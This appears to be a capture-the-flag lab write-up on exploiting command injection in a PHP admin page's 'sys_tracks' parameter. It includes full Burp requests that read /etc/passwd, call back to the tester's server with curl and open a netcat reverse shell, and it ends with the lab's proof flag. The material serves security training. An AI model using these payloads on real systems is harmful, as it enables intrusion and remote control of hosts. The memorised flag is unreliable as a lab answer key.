
#### Finding the Vulnerable Parameter
Upon finding the **System Info Page***, where local.txt was we see in `Burpsuite` that there may be parameters that could be exploited
![[Pasted image 20241111113912.png]]
The parameters `sys_info=` and `sys_tracks=` look like parameters that could be exploited.
![[Pasted image 20241111113848.png]]
originally I tried to replace the `-h` in `sys_info` and the file path in `sys_tracks` however - even after changing them the response still shows the default options, this could potentially mean that they are hard coded into the web page
![[Pasted image 20241111114417.png]]
after looking in the `OFFSEC` discord I saw that someone else abused these parameters the same way however used `;` to append commands.

to test this I utilized `cat /etc/passwd` and ensured to utilize `CTRL+U ` in burp to url encode.
full payload:
```http
POST /dev/admin.php HTTP/1.1

Host: bambi
Content-Length: 63
Cache-Control: max-age=0
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
Origin: http://bambi
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://bambi/dev/admin.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=a3b6945256d08ae6372daaaca7b8c375
Connection: keep-alive

sys_info=-h&sys_tracks=%2Fvar%2Ftmp%2Ftracks%2F;cat+/etc/passwd
```
![[Pasted image 20241111120056.png]]

--------------
#### Testing RCE
After seeing that I had `Local Code Execution` I wanted to test `Remote Code Execution`, to do this I utilized the command below to setup an `apache2` server
```bash
┌──(root💀gobots)-[11Nov2024 16:35:17]-[/var/www/html/bambi]
└─# systemctl restart apache2 
```
and the next command to ensure it was started
```bash
┌──(root💀gobots)-[11Nov2024 16:31:19]-[/home/…/SUT/OSWA/challenge_labs/bambi]                                                                       
└─# systemctl status apache2                                                                         
● apache2.service - The Apache HTTP Server
     Loaded: loaded (/usr/lib/systemd/system/apache2.service; disabled; preset: disabled)            
     Active: active (running) since Mon 2024-11-11 16:30:46 UTC; 35s ago
       Docs: https://httpd.apache.org/docs/2.4/
    Process: 1432328 ExecStart=/usr/sbin/apachectl start (code=exited, status=0/SUCCESS)
   Main PID: 1432383 (apache2)
      Tasks: 7 (limit: 9391)                                                                         
     Memory: 14.2M (peak: 14.8M)
        CPU: 96ms         
     CGroup: /system.slice/apache2.service
             ├─1432383 /usr/sbin/apache2 -k start
             ├─1432438 /usr/sbin/apache2 -k start
             ├─1432439 /usr/sbin/apache2 -k start                                                    
             ├─1432440 /usr/sbin/apache2 -k start
             ├─1432441 /usr/sbin/apache2 -k start
             ├─1432442 /usr/sbin/apache2 -k start
             └─1432443 /usr/sbin/apache2 -k start
                                                                                                     
Nov 11 16:30:45 gobots systemd[1]: Starting apache2.service - The Apache HTTP Server...
Nov 11 16:30:46 gobots apachectl[1432331]: AH00558: apache2: Could not reliably determine the server's fully qualified domain name, using fe80::20c:29ff:fe7c:5cd3%eth0. Set the 'ServerName' directive gl>
Nov 11 16:30:46 gobots systemd[1]: Started apache2.service - The Apache HTTP Server.
```
created a `bambi` directory in `var/www/html`
![[Pasted image 20241111115232.png]]
and utilized the vulnerable parameter to attempt to `curl` the `bambi` directory

original payload:
```bash
curl http://192.168.45.222:80/bambi/
```
full encoded in burpsuite:
```http
POST /dev/admin.php HTTP/1.1
Host: bambi
Content-Length: 88
Cache-Control: max-age=0
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
Origin: http://bambi
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://bambi/dev/admin.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=a3b6945256d08ae6372daaaca7b8c375
Connection: keep-alive

sys_info=-h&sys_tracks=%2Fvar%2Ftmp%2Ftracks%2F;curl+http%3a//192.168.45.222%3a80/bambi/
```
the response displays no indication that it worked
![[Pasted image 20241111115711.png]]
however if we check the `/var/log/apache2/access.log` we can see that the `curl` worked
```bash
┌──(root💀gobots)-[11Nov2024 16:35:50]-[/var/log/apache2]
└─# less /var/log/apache2/access.log
```
![[Pasted image 20241111120007.png]]

-------------
#### Exploiting RCE

can see that `nc` exists on the system with `which nc` - URL encoded of course
![[Pasted image 20241111120243.png]]
setting up `nc` listener on `kali`
```bash
┌──(root💀gobots)-[11Nov2024 17:04:20]-[/var/log/apache2]
└─# nc -lvnp 1337                   
listening on [any] 1337 ...
```
creating payload to get a reverse shell:
```bash
/bin/nc 192.168.45.222 1337 -e /bin/bash
```
full burpsuite payload with url encoding `CTRL+U`
```http
POST /dev/admin.php HTTP/1.1
Host: bambi
Content-Length: 88
Cache-Control: max-age=0
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
Origin: http://bambi
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://bambi/dev/admin.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=a3b6945256d08ae6372daaaca7b8c375
Connection: keep-alive

sys_info=-h&sys_tracks=%2Fvar%2Ftmp%2Ftracks%2F;/bin/nc+192.168.45.222+1337+-e+/bin/bash
```
![[Pasted image 20241111121110.png]]

---------
#### proof.txt
`d11bef021998cd1b94b1b38b473b8b83`
![[Pasted image 20241111121205.png]]
![[Pasted image 20241111121249.png]]